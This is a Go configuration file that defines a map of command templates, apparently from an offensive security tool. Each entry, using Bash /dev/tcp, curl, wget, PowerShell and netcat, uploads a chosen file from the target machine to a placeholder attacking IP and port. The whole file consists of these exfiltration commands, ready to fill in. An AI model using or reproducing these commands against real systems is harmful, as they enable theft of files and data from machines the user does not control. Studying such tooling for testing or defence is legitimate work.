package config

var UploadCommands = map[string]string{
	"Bash": `exec 3<>/dev/tcp/<ATTACKING_IP>/<ATTACKING_PORT>; { printf "POST <UPLOAD_ENDPOINT> HTTP/1.1\r\nHost: <ATTACKING_IP>:<ATTACKING_PORT>\r\nContent-Type: application/octet-stream\r\nFilename: <FILE_PATH>\r\nContent-Length: $(wc -c < <FILE_PATH>)\r\n\r\n"; cat <FILE_PATH>; } >&3; cat <&3; exec 3>&-`,

	"cURL (Multipart Upload)": `curl -X POST http://<ATTACKING_IP>:<ATTACKING_PORT><UPLOAD_ENDPOINT> -F "file=@<FILE_PATH>"`,

	"cURL (Raw Binary Upload)": `curl -X POST --data-binary "@<FILE_PATH>" http://<ATTACKING_IP>:<ATTACKING_PORT><UPLOAD_ENDPOINT> -H "Filename: <FILE_PATH>"`,

	"wget": `wget --method=POST --body-file="<FILE_PATH>" --header="Filename: <FILE_PATH>" --header="Content-Type: application/octet-stream" "http://<ATTACKING_IP>:<ATTACKING_PORT><UPLOAD_ENDPOINT>"`,

	"Invoke-RestMethod (PowerShell)": `Invoke-RestMethod -Uri "http://<ATTACKING_IP>:<ATTACKING_PORT><UPLOAD_ENDPOINT>" -Method Post -InFile "<FILE_PATH>" -ContentType "application/octet-stream" -Headers @{"Filename"="<FILE_PATH>"}`,

	"Invoke-WebRequest (PowerShell)": `Invoke-WebRequest -Uri "http://<ATTACKING_IP>:<ATTACKING_PORT><UPLOAD_ENDPOINT>" -Method Post -InFile "<FILE_PATH>" -ContentType "application/octet-stream" -Headers @{"Filename"="<FILE_PATH>"}`,

	"netcat (nc)": `(echo -en "POST <UPLOAD_ENDPOINT> HTTP/1.1\r\nHost: <ATTACKING_IP>:<ATTACKING_PORT>\r\nContent-Length: $(wc -c < <FILE_PATH>)\r\nFilename: <FILE_PATH>\r\nContent-Type: application/octet-stream\r\n\r\n"; cat <FILE_PATH>) | nc <ATTACKING_IP> <ATTACKING_PORT>`,
}
